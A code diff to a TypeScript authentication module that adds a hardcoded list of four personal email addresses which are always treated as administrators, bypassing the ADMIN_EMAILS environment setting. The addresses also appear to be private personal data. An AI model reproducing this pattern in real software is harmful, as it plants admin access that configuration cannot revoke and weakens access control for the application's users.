@@ -19,22 +19,28 @@ const JWT_SECRET_STRING =
 const JWT_KEY = new TextEncoder().encode(JWT_SECRET_STRING);
 export const AUTH_COOKIE_NAME = "mn_auth_token";
 
+const TRUSTED_ADMIN_EMAILS = [
+  "phultt.it@gmail.com",
+  "celinewang9494@gmail.com",
+  "celinewang94@gmail.com",
+  "levan09041980@gmail.com",
+];
+
 /**
- * Checks if an email is in the ADMIN_EMAILS environment variable list.
+ * Checks if an email is in the admin whitelist or ADMIN_EMAILS environment variable list.
  */
 export function checkIsAdminEmail(email?: string | null): boolean {
   if (!email) return false;
+  const normalized = email.trim().toLowerCase();
+  if (TRUSTED_ADMIN_EMAILS.includes(normalized)) {
+    return true;
+  }
   const adminEmailsEnv = process.env.ADMIN_EMAILS || "";
   const adminList = adminEmailsEnv
     .split(",")
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
-  
-  // Default fallback if env not yet set
-  if (adminList.length === 0) {
-    return email.toLowerCase() === "celinewang94@gmail.com";
-  }
-  return adminList.includes(email.toLowerCase());
+  return adminList.includes(normalized);
 }
 
 /**
